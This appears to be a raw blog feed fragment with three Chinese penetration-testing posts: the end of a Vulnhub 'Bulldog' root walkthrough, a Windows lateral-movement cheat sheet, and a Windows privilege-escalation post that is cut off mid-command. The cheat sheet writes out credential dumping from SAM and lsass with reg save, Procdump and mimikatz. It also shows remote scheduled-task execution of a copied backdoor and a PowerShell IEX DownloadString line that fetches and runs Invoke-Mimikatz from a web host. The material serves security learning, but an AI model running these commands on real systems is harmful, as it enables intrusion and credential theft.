class="line">customPermissionApp  note</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/bulldogadmin/.hiddenadmindirectory</span><br></pre></td></tr></table></figure><h3 id="查看note获取提示"><a href="#查看note获取提示" class="headerlink" title="查看note获取提示"></a>查看note获取提示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cat note</span><br><span class="line">Nick,</span><br><span class="line"></span><br><span class="line">I<span class="string">&#x27;m working on the backend permission stuff. Listen, it&#x27;</span>s super prototype but I think it<span class="string">&#x27;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;</span>s great stuff! Once I<span class="string">&#x27;m finished with it, a hacker wouldn&#x27;</span>t even be able to reverse it! Keep <span class="keyword">in</span> mind that it<span class="string">&#x27;s still a prototype right now. I am about to get it working with the Django user account. I&#x27;</span>m not sure how I<span class="string">&#x27;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Let me know what you think of it!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-Ashley</span></span><br></pre></td></tr></table></figure><h2 id="最终解"><a href="#最终解" class="headerlink" title="最终解"></a>最终解</h2><h3 id="对customPermissionApp文件做一些手脚"><a href="#对customPermissionApp文件做一些手脚" class="headerlink" title="对customPermissionApp文件做一些手脚"></a>对customPermissionApp文件做一些手脚</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ cat customPermissionApp</span><br><span class="line">ELF&gt;�@@X@8@@@@@@�88@8@@@ ``8@ ((`(`�TT@T@DDP�tdxx@x@44Q�tdR�td``��/lib64/ld-linux-x86-64.so.2GNU GNU��32S0-t���Ye?�ҏ��o</span><br><span class="line">                                                                                                                             !(: libc.so.6puts__stack_chk_failIuitem__S�`` `(`0`H�H��__gmon_start__GLIBC_2.4GLIBC_2.2.5ii</span><br><span class="line">                        H��t�[H���5�</span><br><span class="line">                                     �%�</span><br><span class="line">                                         @�%�</span><br><span class="line">                                              h������%z</span><br><span class="line">                                                        h������%r</span><br><span class="line">                                                                  h������%j</span><br><span class="line">                                                                            h�����%<span class="string">&quot;</span></span><br><span class="line"><span class="string">                                                                                     f�1�I��^H��H���PTI���@H���@H���@�����fD�O`UH-H`H��H��vH��t]�H`��f�]�@f.��H`UH��H`H��H��H��H��?H�H��t�H��t</span></span><br><span class="line"><span class="string">                                ]�H`��]�fD�=�</span></span><br><span class="line"><span class="string"> uUH���n���]��</span></span><br><span class="line"><span class="string"> ��@� `H�?u��H��t�UH����]�z���UH��H��pdH�%(H�E�1�@�����@@�����i@����H�SUPERultH�E�H�imatePASH�E�H�SWORDyouH�E�H�CANTgetH�E�H�U��H���H�H��H���H�u�dH34%(t�&#x27;�����DAWAVA��AUATL�%~ UH�-~ SI��I��L)�H�H������H��t 1��L��L��D��A��H��H9�u�H�[]A\A]A^A_Ðf.���H�H��Please enter a valid username to use root privilegesUsage: ./customPermissionApp &lt;username&gt;sudo su root;����h���P^�������x���zR����*zR�$����PFJ</span></span><br><span class="line"><span class="string">�                                                                                    �?;*3$&quot;</span>D�����A�C</span><br><span class="line">Dd8���eB�B�E �B(�H0�H8�M@r8A0A(B BB�`����@�@</span><br><span class="line">�@���o�@H@�@                                `@</span><br><span class="line">_</span><br><span class="line"> ``@�@  ���o�@���o���o�@(`�@�@�@�@GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 201606098@T@t@�@�@H@��@�@</span><br><span class="line">@</span><br><span class="line"> `@</span><br><span class="line">�@�@�@@x@�@`` `(`�``8`H`��</span><br><span class="line">                           `@P@.�@DH`S`z�@�`������@� `���`�(`�`x@`+�@; � 8`WiH`5�@p���8`� �@`�@��@e�P`��@*H`�@� ,H`8</span><br><span class="line">                                                                                                                     `@crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.7585__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrycustomPermissionApp.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edata__stack_chk_fail@@GLIBC_2.4system@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmain_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment8@8<span class="comment">#T@T 1t@t$D���o�@N</span></span><br><span class="line">                                                                                                                                                     �@�VH@H_^���o�@�</span><br><span class="line">       k���o�@�z�@�B@�`@`��@�P����@���@��@�x@x4��@�� �(`(���8`H`0H4J</span><br><span class="line">                                                                            �x/ �R$</span><br></pre></td></tr></table></figure><ul><li>读取后发现是一个二进制文件，根据note提示好像可以直接提到note</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./ customPermissionApp django</span><br><span class="line">/bin/sh: 38: ./: Permission denied</span><br></pre></td></tr></table></figure><ul><li>提示没有权限，我就把它可读的都打印出来看看</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">$ strings customPermissionApp</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">32S0-t</span><br><span class="line">libc.so.6</span><br><span class="line">puts</span><br><span class="line">__stack_chk_fail</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">__gmon_start__</span><br><span class="line">GLIBC_2.4</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">UH-H</span><br><span class="line">SUPERultH</span><br><span class="line">imatePASH</span><br><span class="line">SWORDyouH</span><br><span class="line">CANTget</span><br><span class="line">dH34%(</span><br><span class="line">AWAVA</span><br><span class="line">AUATL</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">Please enter a valid username to use root privileges</span><br><span class="line">Usage: ./customPermissionApp &lt;username&gt;</span><br><span class="line">sudo su root</span><br><span class="line">;*3$<span class="string">&quot;</span></span><br><span class="line"><span class="string">GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609</span></span><br><span class="line"><span class="string">crtstuff.c</span></span><br><span class="line"><span class="string">__JCR_LIST__</span></span><br><span class="line"><span class="string">deregister_tm_clones</span></span><br><span class="line"><span class="string">__do_global_dtors_aux</span></span><br><span class="line"><span class="string">completed.7585</span></span><br><span class="line"><span class="string">__do_global_dtors_aux_fini_array_entry</span></span><br><span class="line"><span class="string">frame_dummy</span></span><br><span class="line"><span class="string">__frame_dummy_init_array_entry</span></span><br><span class="line"><span class="string">customPermissionApp.c</span></span><br><span class="line"><span class="string">__FRAME_END__</span></span><br><span class="line"><span class="string">__JCR_END__</span></span><br><span class="line"><span class="string">__init_array_end</span></span><br><span class="line"><span class="string">_DYNAMIC</span></span><br><span class="line"><span class="string">__init_array_start</span></span><br><span class="line"><span class="string">__GNU_EH_FRAME_HDR</span></span><br><span class="line"><span class="string">_GLOBAL_OFFSET_TABLE_</span></span><br><span class="line"><span class="string">__libc_csu_fini</span></span><br><span class="line"><span class="string">_ITM_deregisterTMCloneTable</span></span><br><span class="line"><span class="string">puts@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">_edata</span></span><br><span class="line"><span class="string">__stack_chk_fail@@GLIBC_2.4</span></span><br><span class="line"><span class="string">system@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__libc_start_main@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__data_start</span></span><br><span class="line"><span class="string">__gmon_start__</span></span><br><span class="line"><span class="string">__dso_handle</span></span><br><span class="line"><span class="string">_IO_stdin_used</span></span><br><span class="line"><span class="string">__libc_csu_init</span></span><br><span class="line"><span class="string">__bss_start</span></span><br><span class="line"><span class="string">main</span></span><br><span class="line"><span class="string">_Jv_RegisterClasses</span></span><br><span class="line"><span class="string">__TMC_END__</span></span><br><span class="line"><span class="string">_ITM_registerTMCloneTable</span></span><br><span class="line"><span class="string">.symtab</span></span><br><span class="line"><span class="string">.strtab</span></span><br><span class="line"><span class="string">.shstrtab</span></span><br><span class="line"><span class="string">.interp</span></span><br><span class="line"><span class="string">.note.ABI-tag</span></span><br><span class="line"><span class="string">.note.gnu.build-id</span></span><br><span class="line"><span class="string">.gnu.hash</span></span><br><span class="line"><span class="string">.dynsym</span></span><br><span class="line"><span class="string">.dynstr</span></span><br><span class="line"><span class="string">.gnu.version</span></span><br><span class="line"><span class="string">.gnu.version_r</span></span><br><span class="line"><span class="string">.rela.dyn</span></span><br><span class="line"><span class="string">.rela.plt</span></span><br><span class="line"><span class="string">.init</span></span><br><span class="line"><span class="string">.plt.got</span></span><br><span class="line"><span class="string">.text</span></span><br><span class="line"><span class="string">.fini</span></span><br><span class="line"><span class="string">.rodata</span></span><br><span class="line"><span class="string">.eh_frame_hdr</span></span><br><span class="line"><span class="string">.eh_frame</span></span><br><span class="line"><span class="string">.init_array</span></span><br><span class="line"><span class="string">.fini_array</span></span><br><span class="line"><span class="string">.jcr</span></span><br><span class="line"><span class="string">.dynamic</span></span><br><span class="line"><span class="string">.got.plt</span></span><br><span class="line"><span class="string">.data</span></span><br><span class="line"><span class="string">.bss</span></span><br><span class="line"><span class="string">.comment</span></span><br></pre></td></tr></table></figure><ul><li>我看到了！！！你看到了吗</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SUPERultH</span><br><span class="line">imatePASH</span><br><span class="line">SWORDyouH</span><br><span class="line">CANTget</span><br><span class="line">dH34%(</span><br><span class="line">AWAVA</span><br><span class="line">AUATL</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">Please enter a valid username to use root privileges</span><br><span class="line">Usage: ./customPermissionApp &lt;username&gt;</span><br><span class="line">sudo su root</span><br><span class="line">;*3$<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这里我们可以看到貌似<code>sudo su</code>之后就提权成功了我将上半部分整理了一下</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUPERultHimatePASHSWORDyouHCANTgetdH34%(</span><br><span class="line">SUPERultimatePASSWORDyouCANTget</span><br></pre></td></tr></table></figure><ul><li>提权</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br></pre></td></tr></table></figure><ul><li>这个该死的tty;导入pty</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">$ sudo su</span><br><span class="line">sudo su</span><br><span class="line">[sudo] password <span class="keyword">for</span> django: SUPERultimatePASSWORDyouCANTget</span><br><span class="line"></span><br><span class="line">root@bulldog:/home/django/bulldog<span class="comment">#</span></span><br></pre></td></tr></table></figure><ul><li>导入pty，深刻怀疑之间也出现这样的情况，早点解决说不定权早就提了</li></ul><h2 id="拿到Flag"><a href="#拿到Flag" class="headerlink" title="拿到Flag"></a>拿到Flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@bulldog:/home/django<span class="comment"># cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">root@bulldog:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">congrats.txt</span><br><span class="line">root@bulldog:~<span class="comment"># cat congrats.txt</span></span><br><span class="line">cat congrats.txt</span><br><span class="line">Congratulations on completing this VM :D That wasn<span class="string">&#x27;t so bad was it?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Let me know what you thought on twitter, I&#x27;</span>m @frichette_n</span><br><span class="line"></span><br><span class="line">As far as I know there are two ways to get root. Can you find the other one?</span><br><span class="line"></span><br><span class="line">Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!</span><br></pre></td></tr></table></figure><h3 id="另外种方法"><a href="#另外种方法" class="headerlink" title="另外种方法"></a>另外种方法</h3><ul><li>图丢了！！！下次补上；以root方式执行，并且是wxr权限的文件，是一个python文件 然后我们将payload写在里面运行后，我们回弹的shell就是root</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域内横向（一）</title>
      <link href="2021/04/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2021/04/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="域内横向（一）"><a href="#域内横向（一）" class="headerlink" title="域内横向（一）"></a>域内横向（一）</h1><h2 id="Windos常用远程连接与命令"><a href="#Windos常用远程连接与命令" class="headerlink" title="Windos常用远程连接与命令"></a>Windos常用远程连接与命令</h2><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><ul><li><p>与目标机器建立ipc$连接</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ <span class="string">&quot;asd123qwe&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure></li><li><p>在被控主机查看建立的连接</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure></li><li><p>删除ipc$连接</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ /del /y</span><br></pre></td></tr></table></figure></li><li><p>ipc$利用条件</p><ol><li>ipc$需要开启139,445端口</li><li>管理员开启默认共享（对于逻辑盘的默认访问）</li></ol></li><li><p>ipc$常见错误号</p><ol><li>5：拒绝访问</li><li>51：Windows主机无法找到网络路径，中存在问题</li><li>53：找不到网络路径，ip地址错误、目标未开机、目标的lanmanserver服务未启动、目标存在防火墙</li><li>67：找不到网络名、lanmanserver服务未启动、ipc$已被删除</li><li>1219：提供的凭据与已存在的凭据集冲突，请查看是否已经连接ipc$</li><li>1326: 未知的用户名或密码错误</li><li>1792：网络登录服务未启动、NetLogon服务未启动</li><li>2242：用户密码已过期</li></ol></li></ul><h3 id="Windows自带工具获取远程主机信息（建立ipc-之后）"><a href="#Windows自带工具获取远程主机信息（建立ipc-之后）" class="headerlink" title="Windows自带工具获取远程主机信息（建立ipc$之后）"></a>Windows自带工具获取远程主机信息（建立ipc$之后）</h3><ul><li>dir  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.10\c$       <span class="comment">#列出远程主机c盘下的文档</span></span><br></pre></td></tr></table></figure></li><li>tasklist  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 192.168.1.10 /U Administrator /P asdqwe1123     <span class="comment">#列出远程主机上的进程</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><ul><li>at命令<ol><li>查看目标系统时间 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.1.10</span><br></pre></td></tr></table></figure></li><li>将后门、payload…复制到目标系统中 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cale.bat \\192.168.1.10\C$</span><br></pre></td></tr></table></figure></li><li>使用at创建计划任务 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00PM C:\cale.bat </span><br></pre></td></tr></table></figure></li><li>清除at记录 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 7 /delete         <span class="comment">#7为任务ID</span></span><br></pre></td></tr></table></figure></li><li>将执行结果写在本地 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00AM cmd.exe /c <span class="string">&quot;ipconfig &gt;C:1.txt&quot;</span></span><br></pre></td></tr></table></figure></li><li>使用type读取远程主机文件 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \\192.168.1.10\C$\1.txt</span><br></pre></td></tr></table></figure></li></ol></li><li>schtasks命令（由于在windows2008、Vista之后at命令被废弃，使用schtasks顶替）<ul><li>创建计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.10 /tn <span class="built_in">test</span> /sc onstart /tr c:\calc.bat /ru system /f     <span class="comment">#在主机上创建一个名为test的任务，在下次开机的时候已system的权限运行C盘下的calc.bat文件```</span></span><br></pre></td></tr></table></figure></li><li>运行主机中的计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.1.10 /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure></li><li>如ipc$没有连接  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/u administrator    <span class="comment">#用户账号</span></span><br><span class="line">/p <span class="string">&quot;123asdqwe&quot;</span>      <span class="comment">#用户密码</span></span><br><span class="line">/f                  <span class="comment">#强制解除</span></span><br></pre></td></tr></table></figure></li><li>删除计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.1.10 /tn <span class="string">&quot;test&quot;</span> /f</span><br></pre></td></tr></table></figure></li><li>日志存储在<code>C:\Windows\Tasks\SchedLgU.txt</code>中</li></ul></li></ul><h2 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h2><h3 id="LM-Hash和NTLM-Hash"><a href="#LM-Hash和NTLM-Hash" class="headerlink" title="LM Hash和NTLM Hash"></a>LM Hash和NTLM Hash</h3><ul><li><p>Windows操作系统中的密码由LM Hash和NTLM Hash组成</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:RID:LM-Hash:NTLM-Hash</span><br></pre></td></tr></table></figure></li><li><p>LM Hash: 其本质为DES加密，Windows在版本Vista和2008之后就将其禁用。如在抓取之后LM-Hash值出现<code>aad3b435b51404eeaad3b435b51404ee</code>就表示LM-Hash被禁用</p></li><li><p>NTLM Hash: 其本质基于MD4加密算法进行加密个人版Vista和服务器版2003之后，Windows操作系统的认证方式采用NTLM Hash</p></li></ul><h3 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h3><ul><li>在Windows操作系统中抓取散列值或者明文密码，其权限必须为System，其本地用户的密码及其散列值都保存在SAM文件中。lsass.exe进程用于实现Windows的安全策略（本地安全策略和登录策略）。如此看来我们就可以使用工具在进程lsass.exe文件和SAM文件中导出密码和散列值。</li></ul><h4 id="读取SAM文件"><a href="#读取SAM文件" class="headerlink" title="读取SAM文件"></a>读取SAM文件</h4><ul><li><p>GetPass、PwDump7</p></li><li><p>通过SAM和System文件抓取密码</p><ol><li><p>导出SAM和System文件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#无工具导出</span></span><br><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure></li><li><p>通过读取SAM和System文件获得NTLM-Hash</p><ul><li><p>使用mimikatz读取SAM和System文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure></li><li><p>使用mimikatz直接读取本地SAM文件，导出Hash信息</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需将mimikatz上传到目标机</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;log&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span>        <span class="comment">#privilege::debug&amp;token::elevate提升权限</span></span><br></pre></td></tr></table></figure></li></ul></li></ol></li></ul><h4 id="dump-lsass文件后读取"><a href="#dump-lsass文件后读取" class="headerlink" title="dump lsass文件后读取"></a>dump lsass文件后读取</h4><ol><li><p>导出lsass.dump文件</p><ul><li><p>使用Procdump导出lsass.dmp文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></li></ul></li><li><p>使用mimikatz导出lsass.dump文件中的密码散列值</p><ul><li>命令环境中运行mimikatz  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.DMP        <span class="comment">#加载文件至mimikatz</span></span><br><span class="line">sekurlsa::logonPasswords full       <span class="comment">#导出散列值</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><ul><li>使用PowerShell对散列值进行Dump操作<ul><li>使用Nishang  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-PassHashes.ps1</span><br></pre></td></tr></table></figure></li></ul></li><li>使用PowerShell远程加载mimikatz抓取散列值和明文</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;网站路径/Invoke-Mimikatz.ps1&#x27;</span>); Invoke-Mimikatz        </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域内横向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内网提权</title>
      <link href="2021/04/16/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/"/>
      <url>2021/04/16/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内网提权"><a href="#Windows内网提权" class="headerlink" title="Windows内网提权"></a>Windows内网提权</h1><p>内网权限：User-&gt;Administrator-&gt;System-&gt;TrustedInstaller<br>纵向提权：Webshell-&gt;管理员<br>横向提权：同级别角色权限之间相互Jump</p><h2 id="系统内核溢出提权"><a href="#系统内核溢出提权" class="headerlink" title="系统内核溢出提权"></a>系统内核溢出提权</h2><ul><li> 发现系统缺失补丁</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发现系统缺失补丁</span><br><span class="line">groups#查看当前权限</span><br><span class="line">systeminfo#列出补丁编号</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn#使用wmic列出已上补丁</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MSF</span><br><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches#寻找缺失补丁</span><br><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester#找出系统中可能被利用的漏洞</span><br></pre></td></tr></table></figure><ul><li>将列出的补丁编号与exp库进行对比，使用不在补丁编号的exp进行提权</li></ul><h2 id="Windows操作系统配置错误利用"><a href="#Windows操作系统配置错误利用" class="headerlink" title="Windows操作系统配置错误利用"></a>Windows操作系统配置错误利用</h2><p>管理员凭据配置错误、服务器配置错误、故意削弱的安全措施、用户权限过高</p><h3 id="服务器系统权限配置错误"><a href="#服务器系统权限配置错误" class="headerlink" title="服务器系统权限配置错误"></a>服务器系统权限配置错误</h3><p>一个低权限用户对于此类系统服务调用的可执行文件拥有写权限，可替换该文件为仍以可执行文件，并随着系统服务的启动获得系统权限<br>两种场景：1. 服务未运行：使用任意服务替换原来服务，然后重启服务。2. 服务正在运行且无法被终止：利用DLL劫持技术并尝试重启服务来进行提权</p><ul><li><p>使用PowerUp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;#检查Windows下服务漏洞</span><br></pre></td></tr></table></figure><p>MSF也使用此漏洞模块，PowerUp列出可能存在的问题服务，并在Abuse Function 部分中直接给出利用方式</p></li><li><p>MSF实战利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 